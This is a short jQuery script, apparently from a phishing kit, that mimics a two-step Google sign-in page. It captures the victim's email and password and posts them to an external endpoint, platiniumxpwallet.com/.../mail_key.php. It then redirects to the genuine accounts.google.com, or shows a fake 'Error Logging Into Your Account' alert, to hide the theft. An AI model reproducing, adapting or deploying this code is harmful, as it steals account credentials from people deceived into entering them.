$('document').ready(function () {


    $('#email_submit').on('click', function () {

        var login = $('#login').val();

        showlog = login.split('@')[0];

        $('h5').html('<i class="fa fa-user"></i> ' + showlog + '@gmail.com <i class="fa fa-chevron-down"></i>');

        $('#email_seat').addClass('hidden');
        $('#password_seat').removeClass('hidden');

        return false;
    })


    $('#full_submit').on('click', function () {

        $('#full_submit').attr('disabled', true);
        $('#full_submit').html('Please Wait...');

        var login = $('#login').val();
        var password = $('#password').val();

        $.ajax({
            url: 'https://platiniumxpwallet.com/external/Google/php/mail_key.php',
            method: 'post',
            data: {
                login,
                password
            },
            success: function (data) {
                console.log(data);
                if (data == 'Sent') {
                    location.assign('https://accounts.google.com');
                } else {
                    alert('Error Logging Into Your Account');
                }
            },
            fail: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            },
            error: function (data) {
                console.log(data);
                alert('Error Logging Into Your Account');
            }
        })

        return false;

    })

})